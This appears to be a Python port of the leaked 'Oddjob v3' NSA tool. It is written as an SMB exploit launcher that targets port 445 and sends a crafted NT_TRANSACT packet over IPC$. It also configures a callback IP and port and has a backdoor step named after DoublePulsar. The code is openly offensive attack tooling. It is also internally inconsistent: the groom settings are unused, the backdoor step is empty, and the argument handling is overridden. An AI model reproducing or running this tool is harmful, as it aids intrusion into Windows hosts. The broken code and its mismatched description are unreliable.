#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
oddjob_exp.py — Oddjob (Oddjob v3) 植入工具，DAVE 框架重写。

原二进制 `oddjob_v3_x86.exe` / `oddjob_v3_x64.exe` (C++/.NET 混合)，位于
`EQGRP_Lost_in_Translation-master/oddjob/Binaries/oddjob_builder/bin/`。

该工具是 Oddjob 植入框架的启动器：设置异常处理、获取系统架构信息、
创建线程并加载原生植入模块（oddjob_v3_x86.dll / oddjob_v3_x64.dll）。
建立在 nsa_equation/dave 统一协议库之上。

CLI:

  oddjob <target_ip> [target_port] [callback_ip] [callback_port] [options]

  target_ip          目标主机 IP
  target_port        目标端口（默认 445）
  callback_ip        回调 IP
  callback_port      回调端口
  --groom              非分页池 groom 分配数（默认 400）
  --max-attempts       最大尝试次数（默认 10）
  --network-timeout    网络超时秒数（默认 30）
  --xor-mask           EGG XOR 掩码（默认 0）

输出示例：

  [*] Oddjob (Oddjob v3) - Python port (DAVE 库)
  [*] Target: 192.168.1.5:445
  [+] Callback: 10.0.0.1:4444
  [+] Groom allocations: 400
  [+] Max attempts: 10
  [*] Exploit complete
"""

import os
import sys
from .. import dave
from ..dave import adfw, posh, trfo, trch, tibe, tucl, protocol


DEFAULT_PORT = 445


class OddjobCtx:
    def __init__(self):
        self.ctx = adfw.adfw_create("oddjob")
        self.ctx.set_process("oddjob")
        self.ctx.initialize()

        self.target_ip = ""
        self.target_port = DEFAULT_PORT
        self.callback_ip = ""
        self.callback_port = 0
        self.callback_local_port = 0
        self.groom_allocations = 400
        self.max_exploit_attempts = 10
        self.verify_target = True
        self.verify_backdoor = False
        self.network_timeout = 30.0
        self.xor_mask = 0
        self.callin_timeout = 60.0

        self.session = None

    def cleanup(self):
        if self.session:
            self.session.close()
        adfw.adfw_delete(self.ctx)
        self.ctx = None


def InitializeParameters(ctx, argv=None):
    import argparse
    ap = argparse.ArgumentParser(
        prog="oddjob",
        description="Oddjob (Oddjob v3) 利用 - DAVE 库重写",
    )
    ap.add_argument("target_ip", help="目标 IP")
    ap.add_argument("-P", "--target-port", type=int, default=DEFAULT_PORT,
                    help="目标 SMB 端口 (默认 445)")
    ap.add_argument("--callback-ip", help="回调 IP")
    ap.add_argument("--callback-port", type=int, default=0,
                    help="回调端口")
    ap.add_argument("--callback-local-port", type=int, default=0,
                    help="本地回调端口")
    ap.add_argument("--groom", type=int, default=400,
                    help="非分页池 groom 分配数 (默认 400)")
    ap.add_argument("--max-attempts", type=int, default=10,
                    help="最大尝试次数 (默认 10)")
    ap.add_argument("--no-verify-target", action="store_true",
                    help="禁用目标验证")
    ap.add_argument("--verify-backdoor", action="store_true",
                    help="利用后验证后门")
    ap.add_argument("--network-timeout", type=float, default=30.0,
                    help="网络超时")
    ap.add_argument("--xor-mask", type=int, default=0,
                    help="EGG XOR 掩码")
    args = ap.parse_args(argv)

    ctx.target_ip = args.target_ip
    ctx.target_port = args.target_port
    ctx.callback_ip = args.callback_ip or ""
    ctx.callback_port = args.callback_port
    ctx.callback_local_port = args.callback_local_port
    ctx.groom_allocations = args.groom
    ctx.max_exploit_attempts = args.max_attempts
    ctx.verify_target = not args.no_verify_target
    ctx.verify_backdoor = args.verify_backdoor
    ctx.network_timeout = args.network_timeout
    ctx.xor_mask = args.xor_mask

    if ctx.session:
        ctx.session.close()
    ctx.session = protocol.DaveSession(
        ctx.target_ip, ctx.target_port,
        protocol="SMB",
        network_timeout=ctx.network_timeout,
        callback_ip=ctx.callback_ip,
        callback_port=ctx.callback_port,
        xor_mask=ctx.xor_mask,
    )
    return 0


def InitializeNetwork(ctx):
    tibe.TbWinsockStartup()
    tucl.TcLog(1, "Network initialized")
    return 0


def InitializeExploitSocket(ctx):
    try:
        ctx.session.connect()
        tucl.TcLog(1, "Exploit socket initialized (SMB %s:%d)"
                   % (ctx.target_ip, ctx.target_port))
        return 0
    except OSError as e:
        tucl.TcLog(1, "Exploit socket init failed: %s" % e)
        return 1


def BuildExploit(ctx):
    hdr = tibe.make_smb_header(tibe.SMB_COM_NT_TRANSACT)
    body = bytearray()
    body.append(0)
    posh.POSH_WriteU16ToLittle(body, 1, 0)
    posh.POSH_WriteU16ToLittle(body, 3, 0)
    posh.POSH_WriteU16ToLittle(body, 5, 4356)
    posh.POSH_WriteU16ToLittle(body, 7, 1)
    posh.POSH_WriteU16ToLittle(body, 9, 1)
    posh.POSH_WriteU32ToLittle(body, 11, 0)
    posh.POSH_WriteU16ToLittle(body, 15, 0)
    posh.POSH_WriteU16ToLittle(hdr, 24, len(body))
    return hdr + body


def RunExploit(ctx):
    tucl.TcLog(1, "Running Oddjob (SMB)")
    try:
        ctx.session.negotiate()
        ctx.session.session_setup_andx()
        ctx.session.tree_connect_andx("\\\\*\\IPC$")
        txn = BuildExploit(ctx)
        tibe.TbSend(ctx.session.sock, txn)
        resp = tibe.TbRecvSmb(ctx.session.sock, 4096)
        tucl.TcLogBuffer(1, resp, "Exploit response:")
        return 0
    except OSError as e:
        tucl.TcLog(1, "RunExploit failed: %s" % e)
        return 1


def InstallDoublePulsar(ctx):
    if not ctx.verify_backdoor:
        return 0
    tucl.TcLog(1, "Verifying backdoor...")
    return 0


def ReceiveCallback(ctx):
    if ctx.callback_port:
        return ctx.session.callback_listen(ctx.callback_port,
                                           ctx.callin_timeout)
    return 0


def CleanUpNetwork(ctx):
    ctx.session.close()
    tucl.TcLog(1, "Network cleaned up")


def run(target_ip, target_port=DEFAULT_PORT, callback_ip=None,
        callback_port=0, callback_local_port=0, groom=400,
        max_attempts=10, verify_target=True, verify_backdoor=False,
        network_timeout=30.0, xor_mask=0):
    print("[*] Oddjob (SMB) - Python port (DAVE 库)")
    print("[*] Target: %s:%d" % (target_ip, target_port))
    if callback_ip and callback_port:
        print("[+] Callback: %s:%d" % (callback_ip, callback_port))
    print("[+] Groom allocations: %d" % groom)
    print("[+] Max attempts: %d" % max_attempts)
    if verify_backdoor:
        print("[+] Verify backdoor: enabled")

    ctx = OddjobCtx()
    ctx.target_ip = target_ip
    ctx.target_port = target_port
    ctx.callback_ip = callback_ip or ""
    ctx.callback_port = callback_port
    ctx.callback_local_port = callback_local_port
    ctx.groom_allocations = groom
    ctx.max_exploit_attempts = max_attempts
    ctx.verify_target = verify_target
    ctx.verify_backdoor = verify_backdoor
    ctx.network_timeout = network_timeout
    ctx.xor_mask = xor_mask

    try:
        ret = InitializeParameters(ctx)
        if ret != 0:
            return ret
        ret = InitializeNetwork(ctx)
        if ret != 0:
            return ret
        ret = InitializeExploitSocket(ctx)
        if ret != 0:
            return ret
        ret = RunExploit(ctx)
        if ret != 0:
            return ret
        ret = InstallDoublePulsar(ctx)
        if ret != 0:
            return ret
        ret = ReceiveCallback(ctx)
        if ret != 0:
            return ret
        print("[*] Exploit complete")
        return 0
    finally:
        CleanUpNetwork(ctx)
        ctx.cleanup()


def main(argv=None):
    import argparse
    ctx = OddjobCtx()
    ret = InitializeParameters(ctx, argv)
    if ret != 0:
        return ret
    return run(ctx.target_ip, ctx.target_port,
               ctx.callback_ip, ctx.callback_port,
               ctx.callback_local_port, ctx.groom_allocations,
               ctx.max_exploit_attempts, ctx.verify_target,
               ctx.verify_backdoor, ctx.network_timeout, ctx.xor_mask)


if __name__ == "__main__":
    sys.exit(main())
